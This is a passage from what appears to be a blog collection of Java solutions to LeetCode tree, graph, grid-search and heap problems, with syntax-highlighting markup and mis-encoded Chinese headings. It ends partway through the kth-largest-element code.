<h3 id="101-å¯¹ç§°äºŒå‰æ ‘-x2F"><a href="#101-å¯¹ç§°äºŒå‰æ ‘-x2F" class="headerlink" title=" 101. å¯¹ç§°äºŒå‰æ ‘&#x2F;"></a><a href="https://leetcode-cn.com/problems/symmetric-tree"> 101. å¯¹ç§°äºŒå‰æ ‘</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> helper(root, root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">helper</span><span class="params">(TreeNode root, TreeNode root1)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span> &amp;&amp; root1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span> &amp;&amp; root1 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">null</span> &amp;&amp; root1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root.val == root1.val &amp;&amp; helper(root.left, root1.right) &amp;&amp; helper(root.right, root1.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="94-äºŒå‰æ ‘çš„ä¸­åºéå†"><a href="#94-äºŒå‰æ ‘çš„ä¸­åºéå†" class="headerlink" title="94. äºŒå‰æ ‘çš„ä¸­åºéå†"></a><a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal">94. äºŒå‰æ ‘çš„ä¸­åºéå†</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŸºäºæ ˆï¼Œ ä¸€ç›´å¾€å·¦èµ°ï¼Œç„¶åå‡ºæ ˆä¸€ä¸ªå°±è¿›å…¥å³å­æ ‘</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty() || cur != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            res.add(cur.val);</span><br><span class="line">            cur = cur.right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é€’å½’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">       inorder(root, res);</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; res)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inorder(root.left, res);</span><br><span class="line">        res.add(root.val);</span><br><span class="line">        inorder(root.right, res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="113-è·¯å¾„æ€»å’Œ-II"><a href="#113-è·¯å¾„æ€»å’Œ-II" class="headerlink" title=" 113. è·¯å¾„æ€»å’Œ II"></a><a href="https://leetcode-cn.com/problems/path-sum-ii"> 113. è·¯å¾„æ€»å’Œ II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">pathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(root, res, path, targetSum);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, List&lt;List&lt;Integer&gt;&gt; res, List&lt;Integer&gt; path, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        path.add(root.val);</span><br><span class="line">        targetSum -= root.val;</span><br><span class="line">        <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span> &amp;&amp; targetSum == <span class="number">0</span>) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(root.left, res, path, targetSum);</span><br><span class="line">        dfs(root.right, res, path, targetSum);</span><br><span class="line">        path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="958-äºŒå‰æ ‘çš„å®Œå…¨æ€§æ£€éªŒ"><a href="#958-äºŒå‰æ ‘çš„å®Œå…¨æ€§æ£€éªŒ" class="headerlink" title=" 958. äºŒå‰æ ‘çš„å®Œå…¨æ€§æ£€éªŒ"></a><a href="https://leetcode-cn.com/problems/check-completeness-of-a-binary-tree"> 958. äºŒå‰æ ‘çš„å®Œå…¨æ€§æ£€éªŒ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCompleteTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedList&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> ((cur = queue.poll()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            queue.add(cur.left);</span><br><span class="line">            queue.add(cur.right);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (queue.poll() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="129-æ±‚æ ¹åˆ°å¶å­èŠ‚ç‚¹æ•°å­—ä¹‹å’Œ"><a href="#129-æ±‚æ ¹åˆ°å¶å­èŠ‚ç‚¹æ•°å­—ä¹‹å’Œ" class="headerlink" title="129. æ±‚æ ¹åˆ°å¶å­èŠ‚ç‚¹æ•°å­—ä¹‹å’Œ"></a><a href="https://leetcode-cn.com/problems/sum-root-to-leaf-numbers">129. æ±‚æ ¹åˆ°å¶å­èŠ‚ç‚¹æ•°å­—ä¹‹å’Œ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumNumbers</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        dfs(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> (val * <span class="number">10</span> + root.val);</span><br><span class="line">        <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            sum += k;</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(root.left, k);</span><br><span class="line">        dfs(root.right, k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å›¾"><a href="#å›¾" class="headerlink" title="å›¾"></a>å›¾</h2><h3 id="127-å•è¯æ¥é¾™"><a href="#127-å•è¯æ¥é¾™" class="headerlink" title="127. å•è¯æ¥é¾™"></a><a href="https://leetcode-cn.com/problems/word-ladder/">127. å•è¯æ¥é¾™</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BFS</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">ladderLength</span><span class="params">(String beginWord, String endWord, List&lt;String&gt; wordList)</span> &#123;</span><br><span class="line"></span><br><span class="line">        HashSet&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(wordList);</span><br><span class="line">        <span class="keyword">if</span> (wordSet.size() == <span class="number">0</span> || !wordSet.contains(endWord)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LinkedList&lt;String&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(beginWord);</span><br><span class="line">        HashSet&lt;String&gt; visited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        visited.add(beginWord);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">currrentSize</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; currrentSize; i++) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">curWord</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span> (bfs(curWord, endWord, wordSet, visited, queue)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> size + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            size++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">bfs</span><span class="params">(String curWord, String endWord, HashSet&lt;String&gt; wordSet, HashSet&lt;String&gt; visited, LinkedList&lt;String&gt; queue)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; endWord.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span>[] cur = curWord.toCharArray();</span><br><span class="line">            <span class="type">char</span> <span class="variable">originChar</span> <span class="operator">=</span> cur[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> <span class="variable">j</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>; j &lt;= <span class="string">&#x27;z&#x27;</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == originChar) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                cur[i] = j;</span><br><span class="line">                <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> String.valueOf(cur);</span><br><span class="line">                <span class="keyword">if</span> (wordSet.contains(temp)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (temp.equals(endWord)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!visited.contains(temp)) &#123;</span><br><span class="line">                        visited.add(temp);</span><br><span class="line">                        queue.offer(temp);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">			cur[i] = originChar;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒå‘BFS, çŸ¥é“èµ·ç‚¹å’Œç»ˆç‚¹å³å¯ç”¨åŒå‘</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">ladderLength</span><span class="params">(String beginWord, String endWord, List&lt;String&gt; wordList)</span> &#123;</span><br><span class="line">       Set&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(wordList);</span><br><span class="line">       <span class="keyword">if</span> (wordSet.size() == <span class="number">0</span> || !wordSet.contains(endWord)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       Set&lt;String&gt; visited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">       Set&lt;String&gt; beginVisited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">       Set&lt;String&gt; endVisited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">       beginVisited.add(beginWord);</span><br><span class="line">       endVisited.add(endWord);</span><br><span class="line">       <span class="type">int</span> <span class="variable">step</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span> (!beginVisited.isEmpty() &amp;&amp; !endVisited.isEmpty()) &#123;</span><br><span class="line">           <span class="keyword">if</span> (beginVisited.size() &gt; endVisited.size()) &#123;</span><br><span class="line">               Set&lt;String&gt; temp = beginVisited;</span><br><span class="line">               beginVisited = endVisited;</span><br><span class="line">               endVisited = temp;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           Set&lt;String&gt; nextLevel = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">           <span class="keyword">for</span> (String word :</span><br><span class="line">                   beginVisited) &#123;</span><br><span class="line">               <span class="keyword">if</span> (bfs(word, endVisited, visited, wordSet, nextLevel)) &#123;</span><br><span class="line">                   <span class="keyword">return</span> step + <span class="number">1</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">           beginVisited = nextLevel;</span><br><span class="line">           step++;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">bfs</span><span class="params">(String word, Set&lt;String&gt; endVisited, Set&lt;String&gt; visited, Set&lt;String&gt; wordSet, Set&lt;String&gt; nextLevel)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] s = word.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; word.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">originChar</span> <span class="operator">=</span> s[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> <span class="variable">j</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>; j &lt;= <span class="string">&#x27;z&#x27;</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == originChar) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                s[i] = j;</span><br><span class="line">                <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> String.valueOf(s);</span><br><span class="line">                <span class="keyword">if</span> (wordSet.contains(temp)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (endVisited.contains(temp)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!visited.contains(temp)) &#123;</span><br><span class="line">                        nextLevel.add(temp);</span><br><span class="line">                        visited.add(temp);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            s[i] = originChar;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="å‰‘æŒ‡-Offer-12-çŸ©é˜µä¸­çš„è·¯å¾„"><a href="#å‰‘æŒ‡-Offer-12-çŸ©é˜µä¸­çš„è·¯å¾„" class="headerlink" title="å‰‘æŒ‡ Offer 12. çŸ©é˜µä¸­çš„è·¯å¾„"></a><a href="https://leetcode-cn.com/problems/ju-zhen-zhong-de-lu-jing-lcof/">å‰‘æŒ‡ Offer 12. çŸ©é˜µä¸­çš„è·¯å¾„</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (board == <span class="literal">null</span> || board.length == <span class="number">0</span> || board[<span class="number">0</span>].length == <span class="number">0</span>  || word == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(word)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] wc = word.toCharArray();</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[board.length][board[<span class="number">0</span>].length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">               <span class="keyword">if</span> (dfs(board, i, j, visited, wc, <span class="number">0</span>)) &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">boolean</span>[][] visited, <span class="type">char</span>[] wc, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i == board.length || j &lt; <span class="number">0</span> || j == board[<span class="number">0</span>].length || visited[i][j] || board[i][j] != wc[start]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (wc.length - <span class="number">1</span> == start) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">res</span> <span class="operator">=</span> dfs(board, i + <span class="number">1</span>, j, visited, wc, start + <span class="number">1</span>)</span><br><span class="line">                || dfs(board, i - <span class="number">1</span>, j, visited, wc, start + <span class="number">1</span>)</span><br><span class="line">                || dfs(board, i, j + <span class="number">1</span>, visited, wc, start + <span class="number">1</span>)</span><br><span class="line">                || dfs(board, i, j - <span class="number">1</span>, visited, wc, start + <span class="number">1</span>);</span><br><span class="line">        visited[i][j] = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="å‰‘æŒ‡-Offer-13-æœºå™¨äººçš„è¿åŠ¨èŒƒå›´"><a href="#å‰‘æŒ‡-Offer-13-æœºå™¨äººçš„è¿åŠ¨èŒƒå›´" class="headerlink" title="å‰‘æŒ‡ Offer 13. æœºå™¨äººçš„è¿åŠ¨èŒƒå›´"></a><a href="https://leetcode-cn.com/problems/ji-qi-ren-de-yun-dong-fan-wei-lcof/">å‰‘æŒ‡ Offer 13. æœºå™¨äººçš„è¿åŠ¨èŒƒå›´</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">movingCount</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>, <span class="number">0</span>, m, n, k, visited);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> k, <span class="type">boolean</span>[][] visited)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || (i/<span class="number">10</span> + i%<span class="number">10</span> + j/<span class="number">10</span> + j%<span class="number">10</span>) &gt; k || visited[i][j]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> dfs(i + <span class="number">1</span>, j, m, n, k, visited) + dfs(i, j + <span class="number">1</span>, m, n, k, visited)</span><br><span class="line">                + dfs(i - <span class="number">1</span>, j, m, n, k, visited) + dfs(i, j - <span class="number">1</span>, m, n, k, visited) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="200-å²›å±¿æ•°é‡"><a href="#200-å²›å±¿æ•°é‡" class="headerlink" title=" 200. å²›å±¿æ•°é‡"></a><a href="https://leetcode-cn.com/problems/number-of-islands"> 200. å²›å±¿æ•°é‡</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numIslands</span><span class="params">(<span class="type">char</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">landNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; grid.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                    infect(grid, i, j);</span><br><span class="line">                    landNum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> landNum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">infect</span><span class="params">(<span class="type">char</span>[][] grid, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= grid.length || j &lt; <span class="number">0</span> || j &gt;= grid[<span class="number">0</span>].length || grid[i][j] != <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        grid[i][j] = <span class="number">2</span>;</span><br><span class="line">        infect(grid, i + <span class="number">1</span>, j);</span><br><span class="line">        infect(grid, i - <span class="number">1</span>, j);</span><br><span class="line">        infect(grid, i, j + <span class="number">1</span>);</span><br><span class="line">        infect(grid, i, j - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h2><h3 id="215-æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ -x2F"><a href="#215-æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ -x2F" class="headerlink" title="215. æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ &#x2F;"></a><a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array/">215. æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ </a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ä»heapSize / 2å¼€å§‹å¾€ä¸Šå †åŒ–</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findKthLargest</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">heapSize</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        buildMaxHeap(nums, heapSize);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            swap(nums, <span class="number">0</span>, heapSize - <span class="number">1</span>);</span><br><span class="line">            heapSize--;</span><br><span class="line">            maxHeapify(nums, <span class="number">0</span>, heapSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">maxHeapify</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> i, <span class="type">int</span> heapSize)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> i * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        